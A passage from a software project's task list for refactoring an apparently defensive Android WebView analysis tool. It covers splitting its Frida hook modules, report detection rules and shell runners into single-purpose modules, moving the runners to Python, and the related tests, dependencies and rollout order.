  - `pollAll()` is the per-WebView loop in the legacy `setInterval`: `inject`, `injectBridgeTaintWrappers`, then `evaluateOnWebView(view, renderBrowserScript("probe", …), ctx.ProbeCallback.$new(), "probe")`.

  Also add `function registerProbeCallback(ctx)`, holding the `Java.registerClass` from legacy lines 597–632 verbatim, which emits `JS_PROBE` and `JS_PROBE_ERROR`.
- [X] T063 [P] [US3] Create `sentry/native/webview_lifecycle.js` with `installWebViewLifecycleHooks(ctx)`, containing:
  - the WebView constructor overloads, which emit `WEBVIEW_CREATED`;
  - `getSettings` (`WEBVIEW_ADDED`);
  - `loadUrl` (both overloads), `postUrl`, `loadData` and `loadDataWithBaseURL` (`URL_LOADED`), each followed by the same `inject` and `injectBridgeTaintWrappers` calls as in the legacy code.
- [X] T064 [P] [US3] Create `sentry/native/webview_settings.js` with `installWebViewSettingsHooks(ctx)`, containing the 11-setter loop from legacy lines 1215–1246 verbatim, with the same setter list in the same order.
- [X] T065 [P] [US3] Create `sentry/native/permissions.js` with:
  - `function hookChromeClientPermissions(ctx, ChromeClientClass, className)`, holding the `onPermissionRequest` and `onGeolocationPermissionsShowPrompt` `hookMethod` blocks from legacy lines 794–826;
  - `installPermissionHooks(ctx)`, holding the `PermissionRequest.grant` and `PermissionRequest.deny` hooks from legacy lines 1248–1268.
- [X] T066 [US3] Create `sentry/native/webview_clients.js` with:
  - `hookWebViewClientClass(ctx, className)`, from legacy lines 649–781;
  - `hookWebChromeClientClass(ctx, className)`, from legacy lines 783–792, which calls `hookChromeClientPermissions` instead of the inline blocks;
  - `installWebViewClientHooks(ctx)`, holding the `setWebViewClient` and `setWebChromeClient` hooks, which emit `WEBVIEW_CLIENT_SET` and `WEBCHROME_CLIENT_SET` and call the class hookers.

  It depends on T065.
- [X] T067 [P] [US3] Create `sentry/native/javascript_bridge.js` with:
  - `hookBridgeMethod` and `hookAllBridgeMethods`, from legacy lines 828–1000, minus anything that belongs to lifecycle;
  - `installJavascriptBridgeHooks(ctx)`, holding the `addJavascriptInterface` hook (`BRIDGE_ADDED`);
  - `SENSITIVE_BRIDGE_METHOD_RE`, moved here.
- [X] T068 [P] [US3] Create `sentry/native/javascript_evaluation.js` with `installJavascriptEvaluationHooks(ctx)`, holding the `evaluateJavascript` hook from legacy lines 1162–1181 (`JS_EVALUATED`).
- [X] T069 [US3] Create `sentry/native/main.js`. Inside `Java.perform(() => { ... })` it:
  1. builds `ctx` (the Java handles, then `ctx.log = log`, `ctx.registry = createRegistry(ctx)`, `ctx.hookMethod = ctx.registry.hookMethod`);
  2. calls `registerProbeCallback(ctx)` and `ctx.delivery = createDelivery(ctx)`;
  3. calls the installers in the legacy order (lifecycle constructors and getSettings, clients, lifecycle load methods, evaluation, bridge, settings, permissions).

     If lifecycle has to be split around the clients to keep the order, give lifecycle two installers, `installWebViewConstructionHooks` and `installWebViewLoadHooks`.
  4. ends with `setInterval(() => { Java.scheduleOnMainThread(() => ctx.delivery.pollAll()); flush(); }, PROBE_POLLING_RATE);`.

  Do **not** include `environment.js` here; it keeps its own `Java.perform`.
- [X] T070 [US3] Delete `sentry/native/webview_hooks.js`. Set the native entries in `sentry/core/agent/manifest.json` to the final order given in [contracts/agent-bundle.md](./contracts/agent-bundle.md): `native/main.js` is the last WebView source, and only `native/environment.js` follows it. That keeps the legacy order of the WebView `Java.perform` first and `getenv` second.
- [X] T071 [US3] Write `sentry/native/README.md`. It contains the family → module → events table from [data-model.md](./data-model.md#native-hook-family), the `ctx` contract, the install order and the reason it matters, and how to add or change a hook family.
- [ ] T072 [US3] Run `python3 -m unittest discover -s tests`, then repeat the T042 live comparison, plus T043 if a KVM host is available. This depends on the baseline log from T042. There must be no differences in the event streams. **Pending:** offline tests pass, including `tests/test_native_parity.py`; the live comparison needs a device.

**Checkpoint**: each native API family lives in one module; the event streams are the same.

---

## Phase 6: User Story 4 - Core split into sub-areas (Priority: P3)

**Goal**: the report pipeline, the orchestration and the runners are split into single-purpose modules. A new detection rule touches only `rules/`. `find_aapt` and the package-name parsing exist once.

**Depends on**: US1 only. It can run in parallel with US2 and US3, because it touches only Python and shell.

**Independent Test**:
- `python3 -m unittest tests.test_report_golden tests.test_layering_core tests.test_extension_point tests.test_package_sh tests.test_cli_contract` passes.

### Tests for User Story 4

- [X] T073 [P] [US4] Implement `tests/test_extension_point.py`. It:
  - copies `sentry/` to a temp dir;
  - writes `core/report/rules/sample.py`, which defines a detector for `EventType.URL_LOADED` that adds a finding with rule id `WV-SAMPLE`, severity `info`, and evidence `{"url": data.get("url")}`;
  - appends its registration to the temp copy's `core/report/rules/__init__.py`, using the registry API from T087;
  - runs the temp `report.py` on `synthetic/navigation.log`;
  - asserts that `WV-SAMPLE` appears in both `report.json` and `report.md`, and that only files under `core/report/rules/` differ from the original tree (SC-006).
- [X] T074 [P] [US4] Implement `tests/test_package_sh.py`. It builds fake `aapt` executables in temp dirs and sources `sentry/core/run/package.sh` through `sh -c`, then asserts:
  - the lookup order is `PATH` first, then the highest version under `$ANDROID_HOME/build-tools/*/aapt`, then `/opt/homebrew/bin/aapt`. Test the Homebrew step only if that path doesn't exist, by pointing `SENTRY_AAPT_FALLBACKS` at temp paths;
  - `apk_package_name`, given the fake output `package: name='com.x' versionCode='1'\nsdkVersion:'21'\nuses-permission: name='a.package.b'`, prints exactly `com.x`.
- [X] T075 [P] [US4] Create `tests/test_layering_core.py` with `class CoreLayering`, using `tests/layering_helpers.py`. It asserts:
  - `sentry/core/report/rules/*.py` contain no `open(`, `.write_text(`, `.write(`, `print(` or `Path(`;
  - `sentry/core/report/{markdown,assemble,tracker}.py` do not import `rules` or `findings`;
  - no `sentry/core/report/**/*.py` mentions `browser` or `native` paths;
  - each `core/report` module is at most 340 lines;
  - each `sentry/core/run/*.sh` and `sentry/core/runners/*.sh` is at most 72 lines;
  - each `sentry/core/benchmark/*.sh` is at most 53 lines;
  - every file has a header.

### Implementation for User Story 4: report package

Do these steps in order. Each one moves code out of `sentry/core/report/cli.py` into a new module verbatim, then makes `cli.py` (later `analyzer.py`) import it. Run the golden gate after each step.

- [X] T076 [US4] Create `sentry/core/report/values.py` with `normalize_value`, `parse_bool`, `first_arg` and `compact`.
- [X] T077 [US4] Create `sentry/core/report/urls.py` with `url_origin`, `normalize_trusted_origin`, `is_remote_url`, `is_cleartext_url`, `is_local_file_url`, `is_data_url` and `is_trusted`.
- [X] T078 [US4] Create `sentry/core/report/loader.py` with `load_events(path) -> tuple[list[dict], int]`, verbatim.
- [X] T079 [US4] Create `sentry/core/report/markdown.py` with `markdown_report(report)`, verbatim. It may import only `values` and `urls`.
- [X] T080 [US4] Create `sentry/core/report/rules/catalog.py` with `SEVERITY_ORDER`, `SEVERITY_SCORE`, `DANGEROUS_SETTINGS`, `SENSITIVE_METHOD_RE`, `NETWORK_JS_EVENTS` and `TAINT_SINK_EVENTS`, verbatim.
- [X] T081 [US4] Create `sentry/core/report/findings.py` with `class FindingStore`. It holds `findings: dict`, and its `add(rule_id, severity, title, description, recommendation, evidence, fingerprint=None)` has the same body as the legacy `add_finding`: the key is `fingerprint or f"{rule_id}:{json.dumps(evidence, sort_keys=True, default=str)}"`, and the evidence cap is `if len(finding["evidence"]) < 20`. It also has `sorted_findings()` and `risk_score()`, which come from `build_report`: sort by `(-SEVERITY_ORDER[severity], rule_id, title)`, and the score is `min(100, sum(SEVERITY_SCORE[...]))`. Make `Analyzer.add_finding` delegate to it.
- [X] T082 [US4] Create `sentry/core/report/tracker.py` with `class WebViewTracker`. Every dict that a `track_*` method returns also includes `"tracker": self`, so detectors can reach `trusted_origins` and the helpers without a separate argument. It has the `webviews` defaultdict with the exact default record keys, `webview(id)`, `trusted_origins`, `latest_url` and `extract_js_network_url`. Give it one `track_<family>(event, data) -> dict` method for each legacy `observe_*` method. Each one contains **only the state mutations** of that method, in their original order, and returns a dict of the values the detectors need, such as `url`, `origin`, `flow` and `webview`.

  **Rule**: every `track_*` must call `self.webview(...)` exactly when the legacy method did, even if nothing changes. That keeps `webview_count` identical.
- [X] T083 [P] [US4] Create `sentry/core/report/rules/navigation.py` with `detect_url_loaded(event, data, tracked, findings)`, holding the `add_finding` calls of the legacy `observe_url` in their original order.
- [X] T084 [P] [US4] Create `sentry/core/report/rules/settings.py` with `detect_setting_changed(...)`, holding the legacy `observe_setting` finding logic, including mixed content.
- [X] T085 [P] [US4] Create `sentry/core/report/rules/bridges.py` with `detect_bridge_added`, `detect_bridge_method_added` and `detect_bridge_method_called`, taken from the legacy `observe_bridge_*`.
- [X] T086 [P] [US4] Create `sentry/core/report/rules/permissions.py` with `detect_permission_requested` and `detect_permission_granted`. Then create `sentry/core/report/rules/javascript.py` with `detect_js_evaluated`, `detect_js_probe` and `detect_probe_error`, taken from the legacy `observe_js_eval`, `observe_js_probe` and `observe_probe_error`.
- [X] T087 [US4] Implement the registry in `sentry/core/report/rules/__init__.py`:
  - `DETECTORS: dict[str, list[Callable]]`, keyed by `EventType.*` values and filled with the T083–T086 functions;
  - `def register(event_type, detector)`, which appends to the list;
  - `def run(event, data, tracked, findings)`, which calls the detectors for `event["type"]` in registration order.
- [X] T088 [US4] Create `sentry/core/report/analyzer.py` with `class Analyzer(trusted_origins)`. It holds a `WebViewTracker` and a `FindingStore`.
  - `observe(event)` keeps the legacy `data` extraction. For the 10 dispatched event types it calls `tracked = tracker.track_<family>(event, data)` followed by `rules.run(event, data, tracked, findings)`. Unknown types do nothing.
  - If a legacy `observe_*` method interleaves state updates and findings so that a finding depends on state set *after* it, split `track_*` into two calls placed around the detector, keeping the legacy order.
  - `build_report(events, skipped)` returns the same dict shape, built with `assemble.py`.
- [X] T089 [US4] Create `sentry/core/report/assemble.py` with `render_webviews(tracker)`, `render_origin_bridge_map(tracker, trusted_origins)` and `build_summary(...)`, all verbatim, with only the `self.` references replaced. Then reduce `sentry/core/report/cli.py` to `build_arg_parser()` and `main()`, keeping the same option names, defaults, help strings, write calls and success message.

### Implementation for User Story 4: orchestration and runners

- [X] T090 [P] [US4] Create `sentry/core/run/common.sh` with `print_banner` (the two echo lines) and `check_missing_commands`, verbatim from the legacy code.
- [X] T091 [US4] Create `sentry/core/run/package.sh`, in POSIX sh:
  - `find_aapt` searches `PATH`, then `${ANDROID_HOME:-${ANDROID_SDK_ROOT:-}}/build-tools`, picking the newest version (`find … -name aapt -perm -111 | sort -V | tail -n 1`), then each path in `${SENTRY_AAPT_FALLBACKS:-/opt/homebrew/bin/aapt /usr/local/bin/aapt}`.
  - `apk_package_name APK` runs `"$AAPT_BIN" dump badging "$1" | sed -n "s/^package: name='\([^']*\)'.*/\1/p" | head -n 1`.

  Use it in `sentry/core/benchmark/run.sh`: delete the local `find_aapt` and `package_name`, source `package.sh`, and replace the `package_name` calls with `apk_package_name`. Keep the benchmark error message `aapt is required on PATH or under ANDROID_HOME/ANDROID_SDK_ROOT`. `SENTRY_AAPT_FALLBACKS` is internal and used only by tests; don't document it in the README.
- [X] T092 [US4] Split `sentry/core/benchmark/run.sh` into three files, moving the code verbatim:
  - `sentry/core/benchmark/archive.sh`: `archive_outputs`;
  - `sentry/core/benchmark/run_one.sh`: `run_one`;
  - `sentry/core/benchmark/run.sh`: `usage`, `die`, `require_command`, the argument handling, the preconditions and the main loop, sourcing the other two (and `core/run/package.sh`) via `$SENTRY_ROOT/sentry/core/…`.

  Each file must be at most 53 lines. Then run `python3 -m unittest tests.test_cli_contract` to check the `--help` output.
- [X] T093 [P] [US4] Create `sentry/core/run/workspace.sh` with `prepare_workspace APK PKG`, which contains the mkdir, cp, touch, rm and `.env` lines verbatim. Create `sentry/core/run/report.sh` with `REPORT_GENERATED=0` and `generate_report`, verbatim.
- [X] T094 [P] [US4] Create `sentry/core/runners/docker.sh` with `run_docker`, verbatim. Split the local runner across two files:
  - `sentry/core/runners/local_device.sh`: `adb_cmd`, `wait_for_boot` (the boot-wait loop and its timeout error) and `ensure_frida_server` (the existence check, its error and the start-if-not-running block), moved verbatim;
  - `sentry/core/runners/local.sh`: `run_local`, keeping only the command checks, the mode messages, the device-visible check, `wait_for_boot`, the install and `adb reverse`, `ensure_frida_server`, the agent build step from T034 and the frida spawn.

  Each file must be at most 72 lines.
- [X] T095 [US4] Reduce `sentry/core/run/main.sh` to this order: source `common.sh`, `package.sh`, `workspace.sh`, `report.sh`, `../runners/docker.sh`, `../runners/local_device.sh` and `../runners/local.sh` (resolved from `$SENTRY_HOME`); then define `sentry_analyse()`, which:
  1. prints the banner;
  2. detects `KVM_AVAILABLE`;
  3. runs `check_missing_commands python3`;
  4. validates the args;
  5. resolves the package with `find_aapt` and `apk_package_name`, keeping the exact legacy messages;
  6. selects the runner;
  7. checks for the compose file;
  8. calls `prepare_workspace`;
  9. sets the traps;
  10. dispatches.

  Run `python3 -m unittest tests.test_cli_contract tests.test_package_sh`.
- [X] T096 [US4] Write `sentry/core/README.md`. It contains the sub-area map (events, agent, run, runners, report, benchmark) and a "Where does my change go?" table with at least these rows:
  - new detection rule → `report/rules/`;
  - report formatting → `report/markdown.py` or `assemble.py`;
  - local device setup → `runners/local.sh`;
  - a new event type → `events/event_types.json`, plus native and report.
- [ ] T097 [US4] Run `python3 -m unittest discover -s tests`, then repeat T042. This depends on the baseline log from T042. **Pending:** offline suite passes; the live comparison needs a device.

**Checkpoint**: the core is split, the extension-point test passes and the golden reports are identical.

---

## Phase 7: Polish & Cross-Cutting Concerns

- [X] T098 [P] Create `tests/test_layering_layout.py` with `class LayoutAndDocs`, using `tests/layering_helpers.py` (SC-004). It asserts:
  - `sentry/` contains exactly the directories `browser`, `native` and `core`, plus the gitignored `build`;
  - the only files directly in `sentry/` are `Dockerfile` and `report.py`;
  - `sentry/hooks`, `sentry/run.sh` and `run-frida-server` do not exist;
  - `sentry/{browser,native,core}/README.md` exist;
  - `README.md` contains a `## Project layout` heading that names all three directories.
- [X] T099 [P] Add a `## Project layout` section to `README.md`, after "Outputs". It gives a 3-row table of the directories and what goes in each, links to the area READMEs, and gives the test command `python3 -m unittest discover -s tests`. Leave every existing usage section unchanged (FR-018). Also add this to the existing Troubleshooting section: "After updating Sentry, rebuild the images with `docker compose build sentry run-frida-server`. An existing `sentry` image keeps running the old hooks."
- [X] T100 [P] Update [contracts/agent-bundle.md](./contracts/agent-bundle.md) and [data-model.md](./data-model.md) so they match the final manifest, module names and install order: the `environment.js` position and any split lifecycle installer.
- [ ] T101 Run `python3 -m unittest discover -s tests -v` with **no** environment overrides. Every test must pass, including `test_benchmark_logs_complete` and `test_rule_coverage` (SC-001, FR-017). **Pending:** only `test_benchmark_logs_complete` fails, pending T014.
- [ ] T102 Run quickstart scenarios A–G in full, plus a Docker benchmark sweep with `scripts/run-benchmarks-linux.sh` on a KVM host. Compare each `benchmark-results/<case>/report.json` with `tests/fixtures/expected/benchmark__<case>/report.json`; they must be identical (SC-002). **Pending:** needs a device and a KVM host.
- [ ] T103 SC-005 walkthrough: give a teammate who doesn't know the code the four tasks from SC-005, have them find the right area from the READMEs only, and record the times in `specs/001-refactor-by-responsibility/checklists/requirements.md` under Notes. Each must be under 2 minutes. **Pending:** needs a teammate.

---

## Phase 8: Shell orchestration → Python (follow-up, research R11)

**Purpose**: replace the 16 shell modules with tested Python, using a Facade (`Host`), Strategy + Factory (runners), a Template Method (`AnalysisSession`) and an Adapter (`Adb`).

- [X] T104 Create `sentry/core/host.py`: the `Host` facade (`getenv`, `which`, `is_linux`, `has_kvm`, `echo`, `die`, `run`, `run_checked`, `tee`, `sleep`) and `require_commands`.
- [X] T105 Create `sentry/core/run/` in Python: `package.py` (shared `find_aapt`, `apk_package_name`), `workspace.py`, `reporting.py` (`report_on_exit`), `session.py` (`AnalysisSession`, signal handlers) and `__main__.py`.
- [X] T106 Create `sentry/core/runners/` in Python: `base.py` (`Runner`, `RunContext`), `docker.py`, `local.py`, `adb.py`, and `__init__.py` (the `RUNNERS` registry and `select_runner`).
- [X] T107 Replace the container scripts with `sentry/core/runners/container/entry.py` and `frida_server.py`. Move the frida-server Dockerfile to `sentry/core/runners/container/frida_server.Dockerfile` (build context `sentry/`, with `python3` installed), and update `sentry/Dockerfile` and `docker-compose.yml`.
- [X] T108 Create `sentry/core/benchmark/suite.py` (`BenchmarkSuite`) and `__main__.py`, keeping the usage text, messages, preflight order, status mapping and archive layout.
- [X] T109 Reduce `analyse.sh` and `scripts/run-benchmarks-linux.sh` to launchers into `python3 -m core.run` and `python3 -m core.benchmark`. Delete every `.sh` file under `sentry/core/`.
- [X] T110 Tests:
  - `tests/fakes.py` (`FakeHost`, fake adb/frida);
  - `tests/test_local_simulation.py` (legacy vs new end to end, device env vars, Ctrl-C → 130 + report);
  - `tests/test_runners.py`;
  - `tests/test_benchmark.py`;
  - `tests/test_package.py`, which replaces `test_package_sh.py`;
  - `tests/test_layering_core.py`, updated with Python size limits, no `.sh` in `core/`, and only `host.py` running processes.
- [X] T111 Update `sentry/core/README.md` and the spec docs (research R11, the plan, `contracts/cli-analyse.md`, the SC-007 note).

---

## Dependencies & Execution Order

### Phase dependencies

- **Setup (Phase 1)** blocks everything.
- **Foundational (Phase 2)** blocks all stories. T014, the benchmark capture, can run late, but T101 needs it.
- **US1 (Phase 3)** depends on Foundational. It is the MVP and blocks US2, US3 and US4, because they all start from the moved code.
- **US2 (Phase 4)** depends on US1.
- **US3 (Phase 5)** depends on US1 and US2, because both edit `native/webview_hooks.js`.
- **US4 (Phase 6)** depends on US1 only, so it **can run in parallel with US2 and US3**. It touches only Python and shell.
- **Polish (Phase 7)** depends on all the stories.

```text
Setup → Foundational → US1 ─┬─> US2 ──> US3 ─┐
                            └─> US4 ─────────┴─> Polish
```

### Within each story

The tests come first, and are written to fail or skip. The golden gate runs after every change to the code. A task that moves code depends on the earlier task that created the file it imports.

### Parallel opportunities

- **Setup**: T002–T006.
- **Foundational**:
  - fixtures T007–T012 in parallel;
  - T019 and T022 in parallel with the golden harness;
  - T020 and T021 sequential.
- **US1**:
  - T024, T025, T028, T029 and T031 in parallel;
  - T036, T037 and T039 in parallel once T034 is done.
- **US2**: the fragments T047–T054 are all in parallel; so are T044 and T046.
- **US3**: T063, T064, T065, T067 and T068 in parallel after T061 and T062.
- **US4**:
  - detectors T083–T086 in parallel after T082;
  - shell modules T090, T093 and T094 in parallel;
  - the whole of US4 can run alongside US2 and US3 if different people work on them.

## Parallel Example: User Story 2

```text
Task: "Create sentry/browser/observer/00_namespace.js"      (T047)
Task: "Create sentry/browser/observer/10_serialize.js"      (T048)
Task: "Create sentry/browser/observer/20_taint.js"          (T049)
Task: "Create sentry/browser/observer/30_intercepts.js"     (T050)
Task: "Create sentry/browser/observer/40_storage.js"        (T051)
Task: "Create sentry/browser/observer/50_bridge_wrapper.js" (T052)
Task: "Create sentry/browser/bridge_taint.js"               (T053)
Task: "Create sentry/browser/probe.js"                      (T054)
```

## Parallel Example: User Story 4 (alongside US2 and US3)

```text
Developer A: US2 → US3 (browser/, native/)
Developer B: T076–T089 (core/report/) then T090–T097 (core/run, core/runners, core/benchmark)
```

## Implementation Strategy

### MVP first (US1)

1. Do Phases 1 and 2. **Commit the baseline before any code moves.**
2. Do Phase 3 (US1): all the logic now sits in the three directories, moved as a whole, and the agent is bundled.
3. **Stop and validate**: run the full test suite and the live local and Docker comparisons (T041–T043). The project now meets the three-directory layout with no change in behavior.

### Incremental delivery

1. US1 is the MVP.
2. US4: the report and the shell gain the extension points. This can run in parallel.
3. US2: the browser code becomes readable and reviewable.
4. US3: the native hooks are split by family.
5. Polish: the layout tests, the docs and the full benchmark sweep.

Each step ends with the golden reports still byte-identical and the live streams still equivalent.

## Notes

- **Added during implementation:** `tests/test_native_parity.py` and `tests/tools/native_harness.js`. They run the legacy two-script agent and the bundle against a mocked Java runtime and a simulated page, and compare the emitted events. This checks the US3 native split without a device.

- **T014 and T043 need a Linux host with `/dev/kvm`.** T042 needs a local emulator with `frida-server`. Every other task runs offline.
- **Never edit `tests/fixtures/legacy/` or `tests/fixtures/expected/`** after T016. The only exception is adding the benchmark cases from T014 with `regen_expected.py --only benchmark__<case>`, which also uses the legacy oracle.
- Commit after each task, or after each `[P]` group.
